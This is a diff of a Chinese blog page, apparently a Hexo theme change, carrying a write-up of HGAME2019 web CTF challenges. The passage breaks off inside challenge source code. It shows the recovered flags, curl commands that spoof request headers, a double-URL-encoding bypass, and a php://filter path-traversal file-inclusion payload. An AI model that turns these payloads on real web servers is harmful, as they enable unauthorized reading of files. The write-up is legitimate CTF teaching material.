@@ -1,1516 +1,395 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next gemini use-motion" lang="en">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=6.7.0"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '6.7.0',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  <meta name="description" content="前言寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做">
-<meta name="keywords" content="CTF">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="前言       寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HGAME2019-Web-Week1&amp;2">
 <meta property="og:url" content="http://chaosec.top/2019/01/30/hgame2019/index.html">
 <meta property="og:site_name" content="Aesm1p&#39; Blog">
-<meta property="og:description" content="前言寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做">
-<meta property="og:locale" content="en">
+<meta property="og:description" content="前言       寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做">
+<meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2019/02/11/5c614ba6c3e49.png">
 <meta property="og:image" content="https://i.loli.net/2019/02/12/5c623f9854da7.png">
 <meta property="og:image" content="https://i.loli.net/2019/02/12/5c6240665dab0.png">
 <meta property="og:image" content="https://i.loli.net/2019/02/12/5c6240ecc59e8.png">
-<meta property="og:updated_time" content="2019-02-12T05:04:28.094Z">
+<meta property="article:published_time" content="2019-01-30T07:15:00.000Z">
+<meta property="article:modified_time" content="2019-02-12T05:04:28.094Z">
+<meta property="article:author" content="Aesm1p">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HGAME2019-Web-Week1&amp;2">
-<meta name="twitter:description" content="前言寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做">
-<meta name="twitter:image" content="https://i.loli.net/2019/02/11/5c614ba6c3e49.png">
-
-
-
-  <link rel="alternate" href="/atom.xml" title="Aesm1p' Blog" type="application/atom+xml"/>
-
-
-
-
-  <link rel="canonical" href="http://chaosec.top/2019/01/30/hgame2019/"/>
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>HGAME2019-Web-Week1&2 | Aesm1p' Blog</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="en">
-
-  
-  
-    
-  
-
-  <div class="bg_content">
-    <canvas id="canvas"></canvas>
-  </div>
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Aesm1p' Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <p class="site-subtitle">前方如聂鲁达的爱情诗一般美好</p>
-      
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Toggle navigation bar">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Home</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>About</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-soul">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/soul" rel="section"><i class="menu-item-icon fa fa-fw fa-book"></i> <br/>soul</a>
-
-  </li>
-
-      
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>Search</a>
-        </li>
-      
-    </ul>
-  
-
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="Searching..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
-</div>
-
-
-
-    </div>
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-
-
-    <main id="main" class="main">
-
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://chaosec.top/2019/01/30/hgame2019/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Aesm1p"/>
-      <meta itemprop="description" content="相逢意气为君饮"/>
-      <meta itemprop="image" content="/images/avatar.jpg"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aesm1p' Blog"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">HGAME2019-Web-Week1&2
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-01-30 15:15:00" itemprop="dateCreated datePublished" datetime="2019-01-30T15:15:00+08:00">2019-01-30</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-12 13:04:28" itemprop="dateModified" datetime="2019-02-12T13:04:28+08:00">2019-02-12</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-            <span class="post-meta-divider">|</span>
-            <span class="post-meta-item-icon"
-            >
-            <i class="fa fa-eye"></i>
-             Views:  
-            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
-            </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做</p>
+<meta name="twitter:image" content="https://i.loli.net/2019/02/11/5c614ba6c3e49.png"><title>HGAME2019-Web-Week1&amp;2 | Aesm1p' Blog</title><link ref="canonical" href="http://chaosec.top/2019/01/30/hgame2019/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: undefined,
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: true,
+  fancybox: true,
+  zoomImage: {"gapAside":"50px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-address-card"></i></span><span class="header-nav-menu-item__text">About</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">HGAME2019-Web-Week1&amp;2</h1><div class="post-meta"><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2019-02-12</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">Words</span><span class="post-meta-item__value">2,130</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">Reading</span><span class="post-meta-item__value">20m</span></span></div></header><div class="post-body">
+        <h1 id="前言">
+          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>
+      <p>寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做</p>
 <a id="more"></a>
-<h1 id="week-1"><a href="#week-1" class="headerlink" title="week-1"></a>week-1</h1><h2 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h2><p>vim文件泄露<code>.index.html.swp</code>，vim恢复即可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2><p>url二次编码绕过 <code>?id=%2576%2569%2564%2561%2572</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;urlDecode_Is_GoOd&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><p>题目要求POST传值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://120.78.184.111:8080/week1/how/index.php --data &quot;want=12&quot;</span><br></pre></td></tr></table></figure>
+
+        <h1 id="week-1">
+          <a href="#week-1" class="heading-link"><i class="fas fa-link"></i></a>week-1</h1>
+      
+        <h2 id="谁吃了我的flag">
+          <a href="#谁吃了我的flag" class="heading-link"><i class="fas fa-link"></i></a>谁吃了我的flag</h2>
+      <p>vim文件泄露<code>.index.html.swp</code>，vim恢复即可得到flag<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><br></pre></td></tr></table></div></figure></p>
+
+        <h2 id="very-easy-web">
+          <a href="#very-easy-web" class="heading-link"><i class="fas fa-link"></i></a>very easy web</h2>
+      <p>url二次编码绕过 <code>?id=%2576%2569%2564%2561%2572</code><br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;urlDecode_Is_GoOd&#125;</span><br></pre></td></tr></table></div></figure></p>
+
+        <h2 id="换头大作战">
+          <a href="#换头大作战" class="heading-link"><i class="fas fa-link"></i></a>换头大作战</h2>
+      <p>题目要求POST传值</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;120.78.184.111:8080&#x2F;week1&#x2F;how&#x2F;index.php --data &quot;want&#x3D;12&quot;</span><br></pre></td></tr></table></div></figure>
 <p>得到回显</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br/&gt;https://www.wikiwand.com/en/X-Forwarded-For&lt;br/&gt;only localhost can get flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&#x2F;&gt;https:&#x2F;&#x2F;www.wikiwand.com&#x2F;en&#x2F;X-Forwarded-For&lt;br&#x2F;&gt;only localhost can get flag</span><br></pre></td></tr></table></div></figure>
 <p>依次按照要求设置请求头</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://120.78.184.111:8080/week1/how/index.php --data &quot;want=12&quot; -H &quot;x-forwarded-for:127.0.0.1&quot; -A &quot;User-Agent:Waterfox/50.0&quot; -e www.bilibili.com</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;hTTp_HeaDeR_iS_Ez&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p>查看源代码可知存在f12.php界面，在响应头中可以看到密码 <code>woyaoflag</code>，提交即会出现<code>cilck me to get flag</code>，点击则跳转到 <code>toofast.php</code>，回显<code>aoh,your speed is sososo fast,the flag must have been left in somewhere</code>，应该是出现了302跳转，抓包即可得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;f12_1s_aMazIng111&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="week-2"><a href="#week-2" class="headerlink" title="week-2"></a>week-2</h1><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>探测目录发现robots.txt下存在文件<code>img/index.php</code>，访问之，得到PHP代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;120.78.184.111:8080&#x2F;week1&#x2F;how&#x2F;index.php --data &quot;want&#x3D;12&quot; -H &quot;x-forwarded-for:127.0.0.1&quot; -A &quot;User-Agent:Waterfox&#x2F;50.0&quot; -e www.bilibili.com</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;hTTp_HeaDeR_iS_Ez&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="can-u-find-me">
+          <a href="#can-u-find-me" class="heading-link"><i class="fas fa-link"></i></a>can u find me?</h2>
+      <p>查看源代码可知存在f12.php界面，在响应头中可以看到密码 <code>woyaoflag</code>，提交即会出现<code>cilck me to get flag</code>，点击则跳转到 <code>toofast.php</code>，回显<code>aoh,your speed is sososo fast,the flag must have been left in somewhere</code>，应该是出现了302跳转，抓包即可得到flag</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;f12_1s_aMazIng111&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="week-2">
+          <a href="#week-2" class="heading-link"><i class="fas fa-link"></i></a>week-2</h1>
+      
+        <h2 id="easy-php">
+          <a href="#easy-php" class="heading-link"><i class="fas fa-link"></i></a>easy_php</h2>
+      <p>探测目录发现robots.txt下存在文件<code>img/index.php</code>，访问之，得到PHP代码</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></div></figure>
 <p>题目过滤了<code>../</code>，且将其转换为空字符串，所以我们可以用<code>..././</code>来绕过，本来试了 <code>..././flag</code>，可是打不出flag，最终尝试了filter协议，原因在于include语句会将代码当做php代码执行，而转成base64编码之后则由于没有php前缀而无法被当成php代码从而将文本打印出来</p>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=..././flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.25.25:9999&#x2F;easyphp&#x2F;img&#x2F;index.php?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;...&#x2F;.&#x2F;flag</span><br></pre></td></tr></table></div></figure>
 <p>base64解码即可得到flag，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;You_4re_So_g0od&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p>代码审计</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;You_4re_So_g0od&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="php-trick">
+          <a href="#php-trick" class="heading-link"><i class="fas fa-link"></i></a>php trick</h2>
+      <p>代码审计</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = 